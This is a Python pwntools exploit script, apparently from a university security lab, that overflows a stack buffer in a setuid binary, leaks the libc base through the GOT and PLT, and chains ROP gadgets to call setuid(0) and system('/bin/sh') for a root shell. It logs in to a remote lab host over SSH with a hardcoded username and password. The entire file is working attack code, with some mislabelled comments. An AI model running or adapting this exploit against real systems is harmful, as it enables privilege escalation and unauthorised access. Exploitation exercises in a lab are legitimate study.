from pwn import * #The pwm module is imported

TARGET = "./target" #The target program is assigned to the variable TARGET

#function sends the cyclic value
def send_cyclic(p):
    p.writeline(cyclic(500))

# This function forces the offset 
def force_offset(p):
    payload = cyclic(500)
    p.sendline(payload)
    
#This function checks the offset by making sure we have control of the Intruction Pointer.
def check_offset(p):
    
    payload = b"A"*OFFSET
    payload += b"BBBB"
    p.sendline(payload)

#This function leaks the libc base address using the global offset table and procedure linkage table of the target program.    
def leak_libc(p, OFFSET):
    theElf = ELF(TARGET)#Target is called by the elf function and assigned to theELF function
    #libcElF = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    libcElF = ELF("remote_libc")#The remote libc library is called 
    
    theRop = ROP(TARGET)#The ROP function calls the rop gadgets of the target.
    
    #The pop rdi gadget is called here.
    POP_RDI = theRop.find_gadget(["pop rdi", "ret"])[0]
    log.info("POP RDI %s", hex(POP_RDI))
     
    #The prinf and puts function are called from the global offset table and procedure linkage table of the target program
    PUTS_GOT = theElf.got["printf"]
    PUTS_PLT = theElf.plt["puts"]
    
    #provides debugging information for the script
    log.info("GOT %s", hex(PUTS_GOT))
    log.info("PLT %s", hex(PUTS_PLT))

    #The main function is called from the target program
    MAIN = theElf.sym["main"]
    
    #This is the rop chain designed to called POP_RDI, PUTS_GOT, PUTS_PLT, MAIN and write it to the payload.
    payload = b"A"*OFFSET
    payload += p64(POP_RDI)
    payload += p64(PUTS_GOT)
    payload += p64(PUTS_PLT)
    payload += p64(MAIN)
    p.writeline(payload)
    
    #Reads the contents of the payload for the output and address.
    out = p.readuntil("Read\n")
    log.info("%s", out)
    addr = p.readline()
    log.info("ARRD %s", addr)
    
    
    leakVal = u64(addr.strip().ljust(8,b"\x00")) #Convert the address to bits.
    
    #debugging information for what the leakVal does.
    log.info("Leaked Address is %s", hex(leakVal))
    
    #Retrieves the prinf function from the libc library
    prtf = libcElF.sym["printf"] # Corrected variable name
    
    #Gets the libc base value by substracting the address of printf from the address of leakVal.   
    libc_base = leakVal - prtf
    log.info("Libc Base is %s", hex(libc_base))
    return libc_base    
    
#This function elevates the privileges to access the root of the target via ssh connection.
def win(p, OFFSET, LIBC_OFFSET):
    theELF = ELF(TARGET)#Target is called by the elf function and assigned to theELF function.

    libcELF = ELF("remote_libc")# This libc library of the remote target.
    #libcELF = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    
    libcELF.address = LIBC_OFFSET# The base address of libc

    SUID = libcELF.sym["setuid"]#calls setuid address from the libc library.
    log.info("SUID %s", hex(SUID))#debugging information for setuid.

    SYSTEM = libcELF.sym["system"]#calls the system address from the libc library.
    log.info("SYSTEM %s", hex(SYSTEM))#debugging information for system.

    SH = next(libcELF.search(b"/bin/sh"))#Searches for the /bin/sh command in the libc library.
    log.info("SH %s", hex(SH))#debugging information for /bin/sh command.

    theRop = ROP(TARGET)#The ROP function calls the rop gadgets of the target.
    
    #The pop rdi gadget is called here.
    POP_RDI = theRop.find_gadget(["pop rdi", "ret"])[0]
    log.info("POP RDI %s", hex(POP_RDI))

    #The return gadget is called here.
    RET = theRop.find_gadget(["ret"])[0]
    log.info("POP RDI %s", hex(RET))
    
    #This is the construction of the ROP
    #The payload is constructed using POP_RDI, SETUID, SH and SYSTEM
    #The ROP chain has been constructed in a way that sets the setuid to 0 to elevate our privilege to root from user.
    #From there the /bin/sh and system is executed to get a shell.
    
    payload = b"A"*OFFSET
    payload += p64(POP_RDI)
    payload += p64(0)
    payload += p64(SUID)
    payload += p64(POP_RDI)
    payload += p64(SH)
    payload += p64(SYSTEM)
    
    
    p.sendline(payload)#sends a string followed by a newline character over a socket connection.
    

if __name__ == "__main__":
    #The target2 program is assigned to the variable TARGET.
    #The offset value is called by the cyclic_find function and assigned to the variable offset. 
    OFFSET = cyclic_find(0x63616175)
    log.info("Cyclic offset is %s", OFFSET)
    
    #runs the script.
    p = process(TARGET, setuid=True)
    
    #runs the script over a ssh connection using the login credentials and currecnt port number to gain a successful connection.
    connect = ssh(host="comsec.org.uk", user="aidenojieo", password="swordfish", port=32793)
    p = connect.run("./target")
    
    #reads a line from the output of the process.
    p.readline()
    
    #Assigns the leak_libc function to variable and using the variable it is called from the win function upon execution.
    LIBC_OFFSET = leak_libc(p, OFFSET)
    win(p, OFFSET, LIBC_OFFSET)

    
    #force_offset(p)
    #check_offset(p)
    
    #Allows us to interact with the script.
    p.interactive()
    
